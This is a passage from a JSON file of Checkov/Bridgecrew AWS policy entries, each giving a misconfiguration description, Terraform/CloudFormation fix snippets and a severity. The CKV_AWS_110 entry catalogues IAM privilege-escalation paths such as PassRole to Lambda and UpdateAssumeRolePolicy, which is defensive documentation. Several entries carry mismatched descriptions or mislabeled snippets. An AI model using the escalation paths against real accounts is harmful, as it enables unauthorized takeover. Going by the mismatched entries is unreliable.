\"private\"\n}\n\nCloudFormation\n\nResource: AWS::S3::Bucket.data\nArgument: Properties.AccessControl\n\nYAMLType: AWS::S3::Bucket\n    Properties:\n        ...\n-     AccessControl: PublicReadWrite / PublicRead\n",
        "severity": "CRITICAL"
    },
    "CKV_AWS_33": {
        "url": "https://docs.bridgecrew.io/docs/ensure-kms-key-policy-does-not-contain-wildcard-principal",
        "description": "KMS key policy contains wildcard (*) principal\nDescription\nA wildcard principal is a placeholder that allows access to all users or accounts, and can potentially expose your KMS keys to unauthorized access.\nBy removing wildcard principals from your key policies, you can ensure that only specific users or accounts have access to your KMS keys. This can help to improve the security of your keys and reduce the risk of unauthorized access.\nFix - Buildtime\nCloudFormation\n\nResource: AWS::KMS::Key\nArgument: Properties.Statement.Principal\n\nYAMLType: AWS::KMS::Key\n    Properties:\n        ...\n        Statement:\n            - ...\n        Principal:\n-           \"*\"\n-           AWS: \"*\"\n+                   AWS: !Sub 'arn:aws:iam::${AWS::AccountId}:root'\n",
        "severity": "HIGH"
    },
    "CKV_AWS_104": {
        "url": "https://docs.bridgecrew.io/docs/ensure-docdb-has-audit-logs-enabled",
        "description": "DocDB does not have audit logs enabled\nDescription\nEnabling audit logs for Amazon DocumentDB (DocDB) can help you to monitor and track activity within your DocDB cluster. Audit logs provide a record of database activity, including details about the activity itself (e.g., which database was accessed, what type of operation was performed), as well as information about the user or application that initiated the activity.\nFix - Buildtime \nTerraform\n\nResource: aws_docdb_cluster_parameter_group\nArgument:  parameter.audit_logs\n\naws_docdb_cluster_parameter_group.test.tfresource \"aws_docdb_cluster_parameter_group\" \"test\" {\n     ...\n+  parameter {\n+    name  = \"audit_logs\"\n+    value = \"enabled\"\n  }\n}\n\nCloudFormation\n\nResource: AWS::DocDB::DBClusterParameterGroup\nArgument:  Parameters.audit_logs\n\nYAMLResources:\n    DocDBParameterGroupEnabled:\n        Type: \"AWS::DocDB::DBClusterParameterGroup\"\n        Properties:\n        ...\n+       Parameters: \n+       audit_logs: \"enabled\"\n            ...\n",
        "severity": "LOW"
    },
    "CKV2_AWS_48": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-config-must-record-all-possible-resources",
        "description": "AWS Config must record all possible resources\nDescription\nThis policy identifies resources for which AWS Config recording is enabled but recording for all possible resources are disabled. AWS Config provides an inventory of your AWS resources and a history of configuration changes to these resources. You can use AWS Config to define rules that evaluate these configurations for compliance. Hence, it is important to enable this feature.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\nGoresource \"aws_config_configuration_recorder\" \"pass_recorder\" {\n  name     = \"example\"\n  role_arn = aws_iam_role.r.arn\n\n  recording_group {\n    include_global_resource_types = true\n  }\n\n}\n\nresource \"aws_config_configuration_recorder_status\" \"pass\" {\n  name       = aws_config_configuration_recorder.pass_recorder.name\n  is_enabled = true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_110": {
        "url": "https://docs.bridgecrew.io/docs/ensure-iam-policies-does-not-allow-privilege-escalation",
        "description": "IAM policies allow privilege escalation\nDescription\nIAM Permissions on Other Users\nCreateAccessKey\nCreating a new user access key for a different user: An attacker with the iam:CreateAccessKey permission on other users can create an access key ID and secret access key belonging to another user in the AWS environment, if they don\u2019t already have two sets associated with them (which best practice says they shouldn\u2019t).\nCreateLoginProfile\nCreating a new login profile for an IAM user: An attacker with the iam:CreateLoginProfile permission on other users can create a password to use to login to the AWS console on any user that does not already have a login profile setup.\nUpdateLoginProfile\nUpdating an existing login profile for an IAM user: An attacker with the iam:UpdateLoginProfile permission on other users can change the password used to login to the AWS console on any user that already has a login profile setup.\nAddUserToGroup\nAdding a user to an Admin group: An attacker with the iam:AddUserToGroup permission can use it to add themselves to an existing IAM Group in the AWS account.\nPermissions on Policies\nCreateNewPolicyVersion\nCreating a new policy version to define custom permissions: An attacker with the iam:CreatePolicyVersion permission can create a new version of an IAM policy that they have access to. This allows them to define their own custom permissions.\nSetExistingDefaultPolicyVersion\nSetting the default policy version to an existing version: An attacker with the iam:SetDefaultPolicyVersion permission may be able to escalate privileges through existing policy versions that are not currently in use.\nAttachUserPolicy\nAttaching a higher-privileged policy to a user that they have access to: An attacker with the iam:AttachUserPolicy permission can escalate privileges by attaching a policy to a user that they have access to, adding the permissions of that policy to the attacker.\nAttachGroupPolicy\nAttaching a higher-privileged policy to a group that they have access to: An attacker with the iam:AttachGroupPolicy permission can escalate privileges by attaching a policy to a group that they are a part of, adding the permissions of that policy to the attacker.\nAttachRolePolicy\nAttaching a higher-privileged policy to a role that they have access to: An attacker with the iam:AttachRolePolicy permission can escalate privileges by attaching a policy to a role that they have access to, adding the permissions of that policy to the attacker.\nPutUserPolicy\nCreating/updating an inline policy for a user: An attacker with the iam:PutUserPolicy permission can escalate privileges by creating or updating an inline policy for a user that they have access to, adding the permissions of that policy to the attacker.\nPutGroupPolicy\nCreating/updating an inline policy for a group: An attacker with the iam:PutGroupPolicy permission can escalate privileges by creating or updating an inline policy for a group that they are a part of, adding the permissions of that policy to the attacker.\nPutRolePolicy\nCreating/updating an inline policy for a role: An attacker with the iam:PutRolePolicy permission can escalate privileges by creating or updating an inline policy for a role that they have access to, adding the permissions of that policy to the attacker.\nUpdating an AssumeRole Policy\nUpdatingAssumeRolePolicy\nUpdating the AssumeRolePolicyDocument of a role: An attacker with the iam:UpdateAssumeRolePolicy and sts:AssumeRole permissions would be able to change the assume role policy document of any existing role to allow them to assume that role.\niam:PassRole\nCreateEC2WithExistingIP\nCreating an EC2 instance with an existing instance profile: An attacker with the iam:PassRole and ec2:RunInstances permissions can create a new EC2 instance that they will have operating system access to and pass an existing EC2 instance profile/service role to it.\nPassExistingRoleToNewLambdaThenInvoke\nPassing a new role to a Lambda function, then invoking it: A user with the iam:PassRole, lambda:CreateFunction, and lambda:InvokeFunction permissions can escalate privileges by passing an existing IAM role to a new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice.\nPassExistingRoleToNewLambdaThenTriggerWithNewDynamo\nPassing a role to a new Lambda function, then triggering it with DynamoDB: A user with the iam:PassRole, lambda:CreateFunction, and lambda:CreateEventSourceMapping (and possibly dynamodb:PutItem and dynamodb:CreateTable) permissions, but without the lambda:InvokeFunction permission, can escalate privileges by passing an existing IAM role to a new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice.\nPassExistingRoleToNewLambdaThenTriggerWithExistingDynamo\nPassing a role to a new Lambda function, then triggering it with DynamoDB: A user with the iam:PassRole, lambda:CreateFunction, and lambda:CreateEventSourceMapping (and possibly dynamodb:PutItem and dynamodb:CreateTable) permissions, but without the lambda:InvokeFunction permission, can escalate privileges by passing an existing IAM role to a new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice.\nEditExistingLambdaFunctionWithRole\nUpdating the code of an existing privileged Lambda function: An attacker with the lambda:UpdateFunctionCode permission could update the code in an existing Lambda function with an IAM role attached so that it would import the relevant AWS library in that programming language and use it to perform actions on behalf of that role.\nPassExistingRoleToNewGlueDevEndpoint\nPassing a role to a Glue Development Endpoint: An attacker with the iam:PassRole and glue:CreateDevEndpoint permissions could create a new AWS Glue development endpoint and pass an existing service role to it.\nPassExistingRoleToCloudFormation\nPassing a role to CloudFormation: An attacker with the iam:PassRole and cloudformation:CreateStack permissions would be able to escalate privileges by creating a CloudFormation template that will perform actions and create resources using the permissions of the role that was passed when creating a CloudFormation stack.\nPassExistingRoleToNewDataPipeline\nPassing a role to Data Pipeline: An attacker with the iam:PassRole, datapipeline:CreatePipeline, and datapipeline:PutPipelineDefinition permissions would be able to escalate privileges by creating a pipeline and updating it to run an arbitrary AWS CLI command or create other resources, either once or on an interval with the permissions of the role that was passed in.\nPrivilege Escalation using AWS Services\nUpdateExistingGlueDevEndpoint\nUpdating an existing Glue Dev Endpoint: An attacker with the glue:UpdateDevEndpoint permission would be able to update the associated SSH public key of an existing Glue development endpoint, to then SSH into it and have access to the permissions the attached role has access to.\nFor more info, visit cloudsplaning documentation\nhttps://cloudsplaining.readthedocs.io/en/latest/glossary/privilege-escalation/",
        "severity": "MEDIUM"
    },
    "CKV_AWS_112": {
        "url": "https://docs.bridgecrew.io/docs/ensure-session-manager-data-is-encrypted-in-transit",
        "description": "Session Manager data is not encrypted in transit\nDescription\nThis policy identifies AWS RDS DB (Relational Database Service Database) cluster snapshots which are not encrypted. It is highly recommended to implement encryption at rest when you are working with production data that have sensitive information, to protect from unauthorized access.\nFix - Buildtime \nTerraform\n\nResource: aws_ssm_document\nArgument:  kmsKeyId\n\naws_ssm_document.test.tfresource \"aws_ssm_document\" \"enabled\" {\n  name          = \"SSM-SessionManagerRunShell\"\n  document_type = \"Session\"\n\n  content = <<DOC\n  {\n        ...\n    \"inputs\": {\n      ...\n      \"s3EncryptionEnabled\": true,\n   +  \"kmsKeyId\": \"${var.kms_key_id}\",\n      \"runAsEnabled\": false,    \n            ...\n      }\n    }\n  }\nDOC\n}\n",
        "severity": "MEDIUM"
    },
    "CKV2_AWS_35": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-nat-gateways-are-utilized-for-the-default-route",
        "description": "AWS NAT Gateways are not utilized for the default route\nDescription\nUsing Amazon NAT Gateways (AWS NAT Gateways) for the default route can help improve the security and performance of your network. NAT Gateways allow you to route traffic from your Amazon Virtual Private Cloud (Amazon VPC) to the Internet, while also hiding the IP addresses of your instances from the Internet. This can help protect your instances from potential threats such as spoofing attacks and port scans.\nFix - Buildtime\nTerraform\nGoresource \"aws_vpc\" \"example\" {\n  cidr_block = \"10.0.0.0/16\"\n}\n\nresource \"aws_internet_gateway\" \"example\" {\n  vpc_id = aws_vpc.example.id\n}\n\nresource \"aws_route_table\" \"aws_route_table_ok_1\" {\n  vpc_id = aws_vpc.example.id\n\n  route {\n    cidr_block = \"0.0.0.0/0\"\n    gateway_id = aws_internet_gateway.example.id\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_130": {
        "url": "https://docs.bridgecrew.io/docs/ensure-vpc-subnets-do-not-assign-public-ip-by-default",
        "description": "VPC subnets should not allow automatic public IP assignment\nDescription\nVPC subnet is a part of the VPC having its own rules for traffic. Assigning the Public IP to the subnet automatically (on launch) can accidentally expose the instances within this subnet to internet and should be edited to 'No' post creation of the Subnet.\nFix - Buildtime \nTerraform\n\nResource: aws_subnet\nArgument: map_public_ip_on_launch\n\naws_subnet.test.tfresource \"aws_subnet\" \"test\" {\n ...\n+ map_public_ip_on_launch = false\n  }\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_146": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-rds-database-cluster-snapshot-is-encrypted-1",
        "description": "RDS database cluster snapshot is not encrypted\nDescription\nEncrypting your RDS database cluster snapshots helps protect your data from unauthorized access or tampering. That way, you can ensure that only authorized users can access and modify the contents of your cluster snapshots. Such action can help protect against external threats such as hackers or malware, as well as internal threats such as accidental or unauthorized access.\nFix - Buildtime \nTerraform\n\nResource:  aws_db_cluster_snapshot\nArgument:  storage_encrypted\n\naws_s3_bucket.test.tfresource \"aws_db_cluster_snapshot\" \"example\" {\n    ...\n+ storage_encrypted = true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_147": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-codebuild-projects-are-encrypted-1",
        "description": "CodeBuild projects are not encrypted\nDescription\nEncrypting your CodeBuild projects helps protect your data from unauthorized access or tampering. That way, you can ensure that only authorized users can access and modify the contents of your projects. Such action can help protect against external threats such as hackers or malware, as well as internal threats such as accidental or unauthorized access.\nFix - Buildtime \nTerraform\n\nResource: aws_codebuild_project\nArgument:  encryption_key\n\naws_s3_bucket.test.tfresource \"aws_codebuild_project\" \"example\" {\n  ...\n+ encryption_key = \"AWS_Key_Management_Service_example\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_148": {
        "url": "https://docs.bridgecrew.io/docs/ensure-no-default-vpc-is-planned-to-be-provisioned",
        "description": "Default VPC is planned to be provisioned\nDescription\nA default VPC is a VPC that is created for your AWS account when you create an AWS account. It includes a default security group and a default network access control list (NACL). Default VPCs have some limitations that might not be suitable for all use cases. Therefore, if you have specific requirements for your VPC, such as custom IP address ranges, support for PrivateLink or Transit Gateway, or the ability to delete the VPC, it might be more appropriate to create a custom VPC instead of using the default VPC.\nFix - Buildtime\nTerraform\nIt is recommended for this resource to not be configured\nGoresource \"aws_default_vpc\" \"default\" {\n            tags = {\n                Name = \"Default VPC\"\n            }\n        }\n",
        "severity": "LOW"
    },
    "CKV_AWS_149": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-secrets-manager-secret-is-encrypted-using-kms",
        "description": "Secrets Manager secret is not encrypted using KMS Customer Managed Key (CMK)\nDescription\nBy default, secrets manager secrets are encrypted using the AWS-managed key aws/secretsmanager. It is best practice to explicitly provide a customer managed key to use instead.\nFix - Buildtime \nTerraform\n\nResource: aws_secretsmanager_secret\nArgument:  kms_key_id\n\naws_s3_bucket.test.tfresource \"aws_secretsmanager_secret\" \"enabled\" {\n   ...\n + kms_key_id = var.kms_key_id\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_192": {
        "url": "https://docs.bridgecrew.io/docs/ensure-waf-prevents-message-lookup-in-log4j2",
        "description": "WAF allows message lookup in Log4j2\nDescription\nUsing a vulnerable version of Apache Log4j library might enable attackers to exploit a Lookup mechanism that supports making requests using special syntax in a format string which can potentially lead to a risky code execution, data leakage and more.\nSet your Web Application Firewall (WAF) to prevent executing such mechanism using the rule definition below.\nLearn more around CVE-2021-44228\nFix - Buildtime \nTerraform\n\nResource: aws_wafv2_web_acl\n\nGoresource \"aws_wafv2_web_acl\" \"pass\" {\n  ...\n\n  rule {\n    name     = \"AWS-AWSManagedRulesKnownBadInputsRuleSet\"\n    priority = 1\n\n    override_action {\n      none {}\n    }\n\n    statement {\n      managed_rule_group_statement {\n        name        = \"AWSManagedRulesKnownBadInputsRuleSet\"\n        vendor_name = \"AWS\"\n      }\n    }\n\n    ...\n  }\n\n  ...\n}\n\nCloudFormation\n\nResource: AWS::WAFv2::WebACL\n\nTextPass:\n    Type: AWS::WAFv2::WebACL\n    Properties:\n      ...\n\n      Rules:\n        - Name: AWS-AWSManagedRulesKnownBadInputsRuleSet\n          Priority: 1\n          Statement:\n            ManagedRuleGroupStatement:\n              VendorName: AWS\n              Name: AWSManagedRulesKnownBadInputsRuleSet\n          OverrideAction:\n            None: {}\n          ...\n",
        "severity": "CRITICAL"
    },
    "CKV_AWS_172": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_storage_1",
        "description": "Ensure QLDB ledger has deletion protection enabled\nDescription\nAmazon Quantum Ledger Database (Amazon QLDB) is a fully managed ledger database for cryptographically verifiable transaction logging. You can use the QLDB API or the AWS Command Line Interface (AWS CLI) to create, update, and delete ledgers in Amazon QLDB. You can also list all the ledgers in your account, or get information about a specific ledger.\nDeletion protection is enabled by default. To successfully delete this resource via Terraform, deletion_protection = false must be applied before attempting deletion. In CloudFormation the flag that prevents a ledger from being deleted by any user. If not provided on ledger creation, this feature is enabled (true) by default.\nFix - Buildtime\nTerraform\n\nResource: aws_qldb_ledger\nArgument:  deletion_protection\n\nGoresource \"aws_qldb_ledger\" \"sample-ledger\" {\n  name             = \"sample-ledger\"\n  permissions_mode = \"STANDARD\"\n+ deletion_protection = true \n}\n\nCloudFormation\n\nResource: AWS::QLDB::Ledger\nArgument:  DeletionProtection\n\nYAMLType: AWS::QLDB::Ledger\nProperties: \n+  DeletionProtection: true\n  KmsKey: String\n  Name: String\n  PermissionsMode: String\n  Tags: \n    - Tag\n",
        "severity": "LOW"
    },
    "CKV_AWS_230": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-nacl-does-not-allow-ingress-from-00000-to-port-20",
        "description": "AWS NACL allows ingress from 0.0.0.0/0 to port 20\nDescription\nNetwork Access Control List (NACL) is stateless and provides filtering of ingress/egress network traffic to AWS resources. We recommend that NACLs do not allow unrestricted ingress access to port 20. Removing unfettered connectivity to remote console services, such as FTP, reduces a server's exposure to risk.\nFix - Buildtime\nCloudFormation\nYAMLResources:  \n  InboundRule:\n    Type: AWS::EC2::NetworkAclEntry\n    Properties:\n       NetworkAclId:\n         Ref: MyNACL\n       RuleNumber: 200\n       Protocol: 6\n       RuleAction: allow\n-      CidrBlock: 0.0.0.0/0\n+      CidrBlock: 10.0.0.0/32\n       PortRange:\n         From: 20\n         To: 20\n\nTerraform\nGoresource \"aws_network_acl_rule\" \"example\" {\n  network_acl_id = aws_network_acl.example.id\n  rule_number    = 200\n  egress         = false\n  protocol       = \"tcp\"\n  rule_action    = \"allow\"\n- cidr_block     = \"0.0.0.0/0\"\n+ cidr_block     = \"10.0.0.0/32\"\n  from_port      = 20\n  to_port        = 20\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_152": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-load-balancer-networkgateway-has-cross-zone-load-balancing-enabled",
        "description": "Load Balancer (Network/Gateway) does not have cross-zone load balancing enabled\nDescription\nCross-zone load balancing is a feature that distributes incoming traffic evenly across the healthy targets in all enabled availability zones. This can help to ensure that your application is able to handle more traffic and reduce the risk of any single availability zone becoming overloaded and might be impact Load balancer's performance\nFix - Buildtime \nTerraform\n\nResource: aws_lb\nArgument: enable_cross_zone_load_balancing\n\naws_s3_bucket.test.tfresource \"aws_lb\" \"enabled\" {\n  ...\n+ enable_cross_zone_load_balancing = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_153": {
        "url": "https://docs.bridgecrew.io/docs/autoscaling-groups-should-supply-tags-to-launch-configurations",
        "description": "No tags supplied by Autoscaling groups to launch configurations\nDescription\nTags help you do the following:\n\nControl access to Auto Scaling groups based on tags. You can use conditions in your IAM policies to control access to Auto Scaling groups based on the tags on that group. \nIdentify and organize your AWS resources. Many AWS services support tagging, so you can assign the same tag to resources from different services to indicate that the resources are related.\nYou can apply tag-based, resource-level permissions in the identity-based policies that you create for Amazon EC2 Auto Scaling. This gives you better control over which resources a user can create, modify, use, or delete.\n\nFix - Buildtime \nTerraform\n\nResource: aws_autoscaling_group\nArgument:  launch_configuration, tags\n\naws_s3_bucket.test.tfresource \"aws_autoscaling_group\" \"passtag\" {\n    ...\n+ launch_configuration      = aws_launch_configuration.foobar.name\n+  tags = concat(\n    [\n      {\n        \"key\"                 = \"interpolation1\"\n        \"value\"               = \"value3\"\n        \"propagate_at_launch\" = true\n      },\n      ...\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_173": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_serverless_5",
        "description": "Encryption settings for Lambda environmental variable is not set properly\nDescription\nYou can use environment variables to adjust your function's behavior without updating code. An environment variable is a pair of strings that is stored in a function's version-specific configuration. The Lambda runtime makes environment variables available to your code and sets additional environment variables that contain information about the function and invocation request. Environment variables are not evaluated prior to the function invocation. Any value you define is considered a literal string and not expanded. Perform the variable evaluation in your function code.\nFix - Buildtime\nTerraform\naws_lambda_function\n\nResource: aws_lambda_function\nArgument: kms_key_arn\n\nGoresource \"aws_lambda_function\" \"test_lambda\" {\n  filename      = \"lambda_function_payload.zip\"\n  function_name = \"lambda_function_name\"\n  role          = aws_iam_role.iam_for_lambda.arn\n  handler       = \"index.test\"\n\n  # The filebase64sha256() function is available in Terraform 0.11.12 and later\n  # For Terraform 0.11.11 and earlier, use the base64sha256() function and the file() function:\n  # source_code_hash = \"${base64sha256(file(\"lambda_function_payload.zip\"))}\"\n  source_code_hash = filebase64sha256(\"lambda_function_payload.zip\")\n\n  runtime = \"nodejs12.x\"\n  \n+ kms_key_arn = \"ckv_km\"\n  \n  environment {\n    variables = {\n      foo = \"bar\"\n    }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_154": {
        "url": "https://docs.bridgecrew.io/docs/ensure-redshift-is-not-deployed-outside-of-a-vpc",
        "description": "Redshift is deployed outside of a VPC\nDescription\nA VPC is a virtual network in the AWS cloud that is isolated from other virtual networks. When you deploy Redshift in a VPC, you can control the inbound and outbound network traffic to and from your Redshift cluster using security groups and network access control lists (NACLs). This can help to improve the security of your Redshift cluster and protect it from unauthorized access or attacks.\nFix - Buildtime \nTerraform\n\nResource: aws_redshift_cluster\nArgument: cluster_subnet_group_name\n\naws_s3_bucket.test.tfresource \"aws_redshift_cluster\" \"pass\" {\n    ...\n+ cluster_subnet_group_name=\"subnet-ebd9cead\"\n}\n\nCloudFormation\n\nResource: AWS::Redshift::Cluster\nArgument: Properties.ClusterSubnetGroupName\n\nYAMLType: \"AWS::Redshift::Cluster\"\n  Properties:\n    ...\n+   ClusterSubnetGroupName: \"subnet-ebd9cead\"\n",
        "severity": "LOW"
    },
    "CKV_AWS_155": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-workspace-user-volumes-are-encrypted",
        "description": "Workspace user volumes are not encrypted\nDescription\nEncrypting your Workspace user volumes helps protect your data from unauthorized access or tampering. That way, you can ensure that only authorized users can access and modify the contents of your volumes. Such action can help protect against external threats such as hackers or malware, as well as internal threats such as accidental or unauthorized access.\nFix - Buildtime \nTerraform\n\nResource: aws_workspaces_workspace\nArgument:  user_volume_encryption_enabled, volume_encryption_key\n\naws_s3_bucket.test.tfresource \"aws_workspaces_workspace\" \"pass\" {\n    ...\n+ user_volume_encryption_enabled = true\n+ volume_encryption_key          = var.volume_encryption_key\n    ...\n}\n\nCloudFormation\n\nResource: AWS::WorkSpaces::Workspace\nArgument:  Properties.UserVolumeEncryptionEnabled\n\nYAMLType: AWS::WorkSpaces::Workspace\n    Properties: \n      ...\n+     UserVolumeEncryptionEnabled: true\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_156": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-workspace-root-volumes-are-encrypted",
        "description": "Workspace root volumes are not encrypted\nDescription\nEncrypting your Workspace root volumes helps protect your data from unauthorized access or tampering. That way, you can ensure that only authorized users can access and modify the contents of your volumes. Such action can help protect against external threats such as hackers or malware, as well as internal threats such as accidental or unauthorized access.\nFix - Buildtime \nTerraform\n\nResource: aws_workspaces_workspace\nArgument:  root_volume_encryption_enabled \n\naws_s3_bucket.test.tfresource \"aws_workspaces_workspace\" \"pass\" {\n    ...\n+ root_volume_encryption_enabled = true\n    ...\n}\n\nCloudFormation\n\nResource: AWS::WorkSpaces::Workspace\nArgument:  Properties.RootVolumeEncryptionEnabled \n\nYAMLType: AWS::WorkSpaces::Workspace\n    ...\n  Properties: \n    ...\n+   RootVolumeEncryptionEnabled: true\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_159": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-athena-workgroup-is-encrypted",
        "description": "Athena Workgroup is not encrypted\nDescription\nAthena workgroups support full server-side encryption for all data at rest which should be enabled.\nFix - Buildtime \nTerraform\n\nResource: aws_athena_workgroup\nArgument:  result_configuration.encryption_configuration\n\naws_s3_bucket.test.tfresource \"aws_athena_workgroup\" \"test\" {\n    ...\n+ configuration {\n        ...\n+   result_configuration {\n+     output_location = \"s3://mys3bucket\"\n+     encryption_configuration {\n+       encryption_option = \"SSE_KMS\"\n+       kms_key_arn       = \"mykmsarn\"\n      }\n    }\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV2_AWS_43": {
        "url": "https://docs.bridgecrew.io/docs/ensure-s3-bucket-does-not-allow-access-to-all-authenticated-users",
        "description": "AWS S3 buckets are accessible to any authenticated user\nDescription\nThis policy identifies S3 buckets accessible to any authenticated AWS users. Amazon S3 allows customer to store and retrieve any type of content from anywhere in the web. Often, customers have legitimate reasons to expose the S3 bucket to public, for example to host website content. However, these buckets often contain highly sensitive enterprise data which if left accessible to anyone with valid AWS credentials, may result in sensitive data leaks.\nFix - Buidtime\nTerraform\nYAMLresource \"aws_s3_bucket_acl\" \"pass\" {\n  bucket = \"name\"\n  access_control_policy {\n    grant {\n      grantee {\n        id   = \"52b113e7a2f25102679df27bb0ae12b3f85be6\"\n        type = \"CanonicalUser\"\n      }\n      permission = \"READ\"\n    }\n    owner {\n      id = data.aws_canonical_user_id.current.id\n    }\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_174": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_networking_63",
        "description": "CloudFront web distribution that allow TLS versions 1.0 or lower\nDescription\nThis policy identifies AWS CloudFront web distributions which are configured with TLS versions for HTTPS communication between viewers and CloudFront. As a best practice, use TLSv1.1_2016 or later as the minimum protocol version in your CloudFront distribution security policies\nFix - Runtime\nAWS Console\n\nSign in to the AWS console\nNavigate to CloudFront Distributions Dashboard\nClick on the reported distribution\nOn 'General' tab, Click on 'Edit' button\nOn 'Edit Distribution' page, Set 'Security Policy' to TLSv1.1_2016 or later as per your requirement.\nClick on 'Yes, Edit'\n\nFix - Buildtime\nTerraform\n\nResource: aws_cloudfront_distribution\nArgument: minimum_protocol_version\n\nGoresource \"aws_cloudfront_distribution\" \"pass\" {\n...\n\n  viewer_certificate {\n    cloudfront_default_certificate = false\n    minimum_protocol_version = \"TLSv1.2_2018\"\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_175": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_networking_64",
        "description": "AWS WAF does not have associated rules\nDescription\nAWS WAF is a web application firewall that helps protect web applications from attacks by allowing you to configure rules that allow, block, or monitor (count) web requests based on conditions that you define. These conditions include IP addresses, HTTP headers, HTTP body, URI strings, SQL injection and cross-site scripting.\nFix - Buildtime\nTerraform\n\nResource: aws_wafv2_web_acl\nAttribute rule - (Optional) The rule blocks used to identify the web requests that you want to allow, block, or count. See Rules below for details.\n\nGoresource \"aws_wafv2_web_acl\" \"example\" {\n  name        = \"managed-rule-example\"\n  description = \"Example of a managed rule.\"\n  scope       = \"REGIONAL\"\n\n  default_action {\n    allow {}\n  }\n\n+  rule {\n    name     = \"rule-1\"\n    priority = 1\n\n    override_action {\n      count {}\n    }\n\n    statement {\n      managed_rule_group_statement {\n        name        = \"AWSManagedRulesCommonRuleSet\"\n        vendor_name = \"AWS\"\n\n        excluded_rule {\n          name = \"SizeRestrictions_QUERYSTRING\"\n        }\n\n        excluded_rule {\n          name = \"NoUserAgent_HEADER\"\n        }\n\n        scope_down_statement {\n          geo_match_statement {\n            country_codes = [\"US\", \"NL\"]\n          }\n        }\n      }\n    }\n\n    visibility_config {\n      cloudwatch_metrics_enabled = false\n      metric_name                = \"friendly-rule-metric-name\"\n      sampled_requests_enabled   = false\n    }\n  }\n\n  tags = {\n    Tag1 = \"Value1\"\n    Tag2 = \"Value2\"\n  }\n\n  visibility_config {\n    cloudwatch_metrics_enabled = false\n    metric_name                = \"friendly-metric-name\"\n    sampled_requests_enabled   = false\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_161": {
        "url": "https://docs.bridgecrew.io/docs/ensure-rds-database-has-iam-authentication-enabled",
        "description": "RDS database does not have IAM authentication enabled\nDescription\nIAM authentication uses AWS Identity and Access Management (IAM) to authenticate users and applications that connect to your RDS database. This can be more secure than traditional password-based authentication, as it allows you to use IAM policies and multi-factor authentication to control access to your database.\nFix - Buildtime \nTerraform\n\nResource: \"aws_db_instance\nArgument: iam_database_authentication_enabled\n\naws_s3_bucket.test.tfresource \"aws_db_instance\" \"test\" {\n    ...\n+ iam_database_authentication_enabled = true\n}\n\nCloudFormation\n\nResource: \"AWS::RDS::DBInstance\nArgument: Properties.EnableIAMDatabaseAuthentication\n\nYAMLResources:\n  DB:\n    Type: 'AWS::RDS::DBInstance'\n    Properties:\n      Engine: 'mysql' # or 'postgres'\n      ...\n+     EnableIAMDatabaseAuthentication: true\n",
        "severity": "MEDIUM"
    },
    "CKV2_AWS_9": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-ebs-are-added-in-the-backup-plans-of-aws-backup",
        "description": "EBS does not have an AWS Backup backup plan\nDescription\nEnsure that EBS are included in your backup plans for the AWS Backup. AWS Backup is a fully managed backup service that helps you protect your data in the cloud by automatically backing up your data to a secure, durable storage location. By creating a backup plan, you can ensure that your data is regularly backed up and can be recovered in the event of data loss or corruption.\nFix - Buildtime \nTerraform\n\nResource: aws_backup_selection, aws_ebs_volume\nArgument: resources and plan_id of aws_backup_selection\n\nGoresource \"aws_ebs_volume\" \"ebs_good\" {\n  availability_zone = \"us-west-2a\"\n  size              = 40\n\n  tags = {\n    Name = \"HelloWorld\"\n  }\n}\n\n\nresource \"aws_backup_selection\" \"backup_good\" {\n  iam_role_arn = \"arn\"\n  name         = \"tf_example_backup_selection\"\n  plan_id      = \"123456\"\n\n  resources = [\n    aws_ebs_volume.ebs_good.arn\n  ]\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_162": {
        "url": "https://docs.bridgecrew.io/docs/ensure-rds-cluster-has-iam-authentication-enabled",
        "description": "RDS cluster does not have IAM authentication enabled\nDescription\nIAM authentication uses AWS Identity and Access Management (IAM) to authenticate users and applications that connect to your RDS database. This can be more secure than traditional password-based authentication, as it allows you to use IAM policies and multi-factor authentication to control access to your database.\nFix - Buildtime \nTerraform\n\nResource: aws_rds_cluster\nArgument: iam_database_authentication_enabled\n\naws_s3_bucket.test.tfresource \"aws_rds_cluster\" \"enabled\" {\n    ...\n+ iam_database_authentication_enabled = true\n}\n\nCloudFormation\n\nResource: AWS::RDS::DBCluster\nArgument: Properties.EnableIAMDatabaseAuthentication\n\nYAMLResources:\n  Enabled:\n    Type: 'AWS::RDS::DBCluster'\n    Properties:\n      ...\n+     EnableIAMDatabaseAuthentication: true\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_164": {
        "url": "https://docs.bridgecrew.io/docs/ensure-transfer-server-is-not-exposed-publicly",
